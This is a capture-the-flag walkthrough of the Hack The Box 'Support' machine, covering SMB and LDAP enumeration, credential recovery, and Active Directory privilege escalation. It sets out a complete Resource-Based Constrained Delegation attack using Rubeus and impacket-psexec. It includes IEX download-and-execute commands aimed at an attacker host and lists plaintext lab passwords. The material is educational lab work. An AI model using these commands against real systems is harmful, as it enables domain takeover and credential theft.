## Support

Difficulty: Easy

### User Flag

```
rustscan -a 10.10.11.174 --ulimit 5000 -- -A -sV -sC -oN nmap.txt -Pn
```

![nmap](https://github.com/b1d0ws/OSCP/assets/58514930/c869072a-f931-410c-b780-52c5d2450141)

<br>

Listing shares, support-tools draws our attention.

```
smbclient -L //support.htb0

crackmapexec smb 10.10.11.174 --shares -u 'DoesNotExist' -p ''
```

![enumeratingShares](https://github.com/b1d0ws/OSCP/assets/58514930/a5541cff-3666-4e33-9b71-c9232a24c3fb)

<br>

Inside smb with null session, UserInfo.exe.zip is interesting.

```
smbclient -U "" //support.htb/support-tools
```

![gettingUserInfo](https://github.com/b1d0ws/OSCP/assets/58514930/a8daea02-4cc4-410a-9991-93cc8f8ec152)

<br>

UserInfo seems to connect on support.htb with LDAP connections. We can intercept the executable in wireshark to get credentials.  

We could also break this reversing with dnSpy and crack the password with cyberchef, but this will be on the end of this write up.

![wireshark](https://github.com/b1d0ws/OSCP/assets/58514930/afaa754c-1950-49c0-b858-073587f554c2)

<br>

With this LDAP credentials, we can use ldapsearch to find DC information.  

You can search users with CN=<user>. Support password is on "Info" field.

```
# Testing credentials
crackmapexec smb 10.10.11.174 -d support -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'

ldapsearch -x -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -H ldap://10.10.11.174 -b "dc=support,dc=htb"  > ldap.out
```

![ldapSearch](https://github.com/b1d0ws/OSCP/assets/58514930/ab35b6a9-d6d8-4418-b2a8-6d10b9b09229)

![ldapOut](https://github.com/b1d0ws/OSCP/assets/58514930/56cc6410-ab6c-4fd2-a64e-c161642129ef)

<br>

We can login with this credentials on evil-winrm.

```
evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb
```

![evilWinRM](https://github.com/b1d0ws/OSCP/assets/58514930/b97203c9-802f-412c-b26f-53c798b28e6c)

<br>

### Root Flag

Enumerate that the machine is a domain controller and add the information to /etc/hosts

```
Get-ADDomain
```

![dcInfo](https://github.com/b1d0ws/OSCP/assets/58514930/ba5e51a0-15a7-42e4-98ac-31de8da02238)

<br>

Enumerate Groups our user belongs

```
whoami /groups
```

![groups](https://github.com/b1d0ws/OSCP/assets/58514930/ea15fa11-ea70-4a30-b5bb-e5de0b46ded2)

<br>

Interesting groups are: Authenticated Users and Shared Support Accounts.  

Let's use Bloodhound to identify what we can do with this.

```
sudo neo4j start
bloodhound
```

Upload SharpHound.exe to collect AD data, it is inside BloodHound/Collectors.

```
upload SharpHound.exe
download 20230830121419_BloodHound.zip
```

![sharpHound](https://github.com/b1d0ws/OSCP/assets/58514930/ec0e8bd3-6216-47ce-9398-e37d82badc92)

<br>

We can mark Support User as owned and this will show us that our user has Group Delegated Object Control.

Clicking, we see that the group Shared Support Accounts has GenericAll privileges on DC.  

![bloodHound](https://github.com/b1d0ws/OSCP/assets/58514930/9f03e893-d5f0-41f1-9246-79a004b91418)

<br>

Right click on the line called GenericAll and select Help to see how to exploit this privilege.  

![tutorialBloodhound](https://github.com/b1d0ws/OSCP/assets/58514930/2cf8007b-27f8-4449-93c4-ffc3277cfafc)

<br>

Abusing GenericAll to perform *Resourced Based Constrained Delegation*:

```
wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1
git clone https://github.com/PowerShellMafia/PowerSploit.git -b dev
git clone https://github.com/Flangvik/SharpCollection
```

We need powerview that is inside PowerSploit/Recon and rubeus that is inside SharpCollection/NetFramework_4.7_Any.

```
curl 10.10.14.21:8000/Rubeus.exe -o Rubeus.exe
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.21:8000/Powermad.ps1')
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.21:8000/PowerView.ps1')
```

![downloadResources](https://github.com/b1d0ws/OSCP/assets/58514930/12070feb-49c2-452f-8f1f-adf5eb3ee70a)

<br>

Now we can follow Bloodhound guide to exploit this.

```
# Looking how many machines we can create
Get-DomainObject -Identity 'DC=SUPPORT,DC=HTB' | select ms-ds-machineaccountquota

# Generating Ticket
New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)

$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid

$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} 

.\Rubeus.exe hash /password:Summer2018!

.\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt

# Create a ticket file
nano ticket.kirbi

# Remove spaces in vi
:%s/ //g 

mv ticket.kirbi ticket.kirbi.b64

base64 -d ticket.kirbi.64 > ticket.kirbi

impacket-ticketConverter ticket.kirbi ticket.ccache

KRB5CCNAME=ticket.ccache impacket-psexec -k -no-pass support.htb/administrator@dc.support.htb
```

![privEsc](https://github.com/b1d0ws/OSCP/assets/58514930/c1cb0f16-d384-40bc-b812-6c0ebb39005a)

#### Other methods to get ldap password

First we can get the function and encrypted password with [dnsSpy](https://github.com/dnSpy/dnSpy).

![dnsSpy](https://github.com/b1d0ws/OSCP/assets/58514930/fe667dec-b7f7-47bc-99d7-9e1504122e38)

<br>

We can decrypt if cyberchef.

![cyberChef](https://github.com/b1d0ws/OSCP/assets/58514930/82c4a7d1-c12b-4097-aba7-e3d94149bce7)

<br>

Or create a python script to decrypt it.

```python
import base64
from itertools import cycle

enc_password = base64.b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E")
key = b"armando"
key2 = 223
res = ''

for e,k in zip(enc_password, cycle(key)):
	res += chr(e ^ k ^ key2)
print(res)
```
